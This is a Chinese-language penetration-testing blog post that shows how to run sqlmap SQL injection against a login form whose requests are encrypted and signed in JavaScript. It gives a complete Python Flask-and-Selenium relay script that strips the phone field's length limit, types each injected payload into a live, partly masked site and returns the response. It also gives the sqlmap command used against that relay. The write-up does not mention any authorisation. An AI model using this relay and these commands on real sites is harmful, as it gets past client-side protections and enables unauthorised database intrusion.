<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="渗透测试中有时候前端提交的数据会进行加密之类的操作, 有些加密的函数还不好找, 其实可以用 selenium 调用 chrome 驱动中转后进行测试。"/>
  <meta name="author" content="Reber"/>
  
    
      <title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入 | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</h1>
      
<div class="post-meta">
    <time>2019-07-27</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
</div>

      <div><h3 id="0x00-先说前提">0x00 先说前提</h3>
<p>昨天某个小伙伴说有个注入没法搞
<img src="/img/post/Xnip2019-07-27_19-20-07.png" alt="60"></p>
<p>前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了
<img src="/img/post/Xnip2019-07-27_18-40-20.png" alt="">
<img src="/img/post/Xnip2019-07-27_18-41-18.png" alt=""></p>
<h3 id="0x01-找加密的-js-文件">0x01 找加密的 js 文件</h3>
<p>注入的地方是获取验证码时的手机号, 刚开始想着先找到 js 加密的函数, 然后生成 sign 再组数据包发送。</p>
<p>就像 <a href="/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">记一次SQL Server报错注入</a> 中一样, 用 selenium 或者 PhantomJS 执行 js 代码生成sign</p>
<p>一番查找发现了加密的 js 文件函数, 但是用的是 angular 这个前端框架, 没用过这个东西。。。。。
<img src="/img/post/Xnip2019-07-27_19-06-48.png" alt="80">
<img src="/img/post/Xnip2019-07-27_19-12-37.png" alt="80"></p>
<p>能看懂一般的 js 代码, 但是这个没得搞, 不懂。。。</p>
<h3 id="0x02-数据中转">0x02 数据中转</h3>
<p>本来昨天我已经放弃了的, 结果今天上午小伙伴又找我了, 说还没有整好, 又看了一通 js, 仍然无解, 看不懂。。。</p>
<p>想起昨天有个大佬说用 PhantomJS + flask 这样、那样、再这样, 中转数据就可以用 sqlmap 跑了, emmmmm。。。</p>
<!-- raw HTML omitted -->
<p>虽然很早以前用过 asp 的 <a href="/posts/2015/injection-of-asp-in-the-cookie/?_blank">Cookie 注入中转</a> , 但是那个是软件, 一直没有搞懂原理, 现在正好趁机学下</p>
<p>经过各种百度, 大概明白了, 应是本地起个 server, sqlmap 就扫描这个 server, server 接收到 payload 后将 payload 加到表单中, 然后模拟提交表单</p>
<h3 id="0x03-selenium-和-flask-进行中转">0x03 selenium 和 flask 进行中转</h3>
<p>没有接触过 PhantomJS, 但是 selenium 以前用过, 可以尝试下</p>
<p>大概看了下, 我们需要注意动态的消息提示框, 需要处理 input 的长度
<img src="/img/post/Xnip2019-07-27_20-25-39.png" alt="90"></p>
<p>大概代码就是下面这样了:</p>
<pre tabindex="0"><code>#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from lxml import etree
from flask import Flask
from flask import request
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# chrome_options = Options()
# chrome_options.add_argument(&#39;--headless&#39;)
# chrome = webdriver.Chrome(executable_path=&#34;/opt/chromedriver&#34;, options=chrome_options)
chrome = webdriver.Chrome(executable_path=&#34;/opt/chromedriver&#34;)
chrome.get(&#34;https://cx.xxxxxxx.cn/#dashboard&#34;)


app = Flask(__name__)

def send(payload):
    # 用两种登陆方式, 这里切换到验证码登陆方式
    chrome.find_element_by_link_text(&#34;手机登录&#34;).click()

    # 手机号长度有限制, 去除 input 的 maxlength 属性
    chrome.execute_script(&#34;document.getElementById(&#39;modile&#39;).removeAttribute(&#39;maxlength&#39;)&#34;)

    # 给 input 标签赋值
    chrome.find_element_by_id(&#34;modile&#34;).send_keys(payload)

    # 点击发送验证码
    chrome.find_element_by_id(&#34;BtnphoneNote&#34;).click()

    # 网速不好时服务器返回数据慢所以用 while
    while True:
        selector = etree.HTML(chrome.page_source)
        message = selector.xpath(&#34;//div[@class=&#39;ng-binding ng-scope&#39;]/text()&#34;)
        if message:
            time.sleep(0.5)
            # 得到返回的信息后, 关闭信息提示框, 然后清除 input 的内容便于发送下一个 payload
            chrome.find_element_by_class_name(&#34;close&#34;).click()
            chrome.find_element_by_id(&#34;modile&#34;).clear()
            break
        time.sleep(0.5)
    return &#34;ttttt&#34;+message[0]

@app.route(&#39;/&#39;)
def index():
    payload = request.args.get(&#34;payload&#34;)
    return send(payload)


if __name__ == &#34;__main__&#34;:
    app.run()
</code></pre><h3 id="0x04-sqlmap-测试效果">0x04 sqlmap 测试效果</h3>
<ul>
<li>启动 flask 服务</li>
</ul>
<pre tabindex="0"><code>[16:09 reber@wyb at ~/Pentest]
➜  python3 tmp.py
* Serving Flask app &#34;tmp&#34; (lazy loading)
* Environment: production
WARNING: Do not use the development server in a production environment.
Use a production WSGI server instead.
* Debug mode: off
* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
</code></pre><ul>
<li>使用 sqlmap 尝试扫描</li>
</ul>
<pre tabindex="0"><code>sqlmap --risk 2 --level 3 --tamper space2comment --batch --random-agent -u &#34;http://127.0.0.1:5000/?payload=13188888888*&#34; --dbms=&#34;Oracle&#34; --technique=E --current-db
</code></pre><ul>
<li>flask 接收到了payload</li>
</ul>
<p><img src="/img/post/Xnip2019-07-27_20-42-19.png" alt=""></p>
<ul>
<li>sqlmap 执行结果</li>
</ul>
<p><img src="/img/post/Xnip2019-07-27_20-40-16.png" alt=""></p>
<!-- raw HTML omitted -->
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2023
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
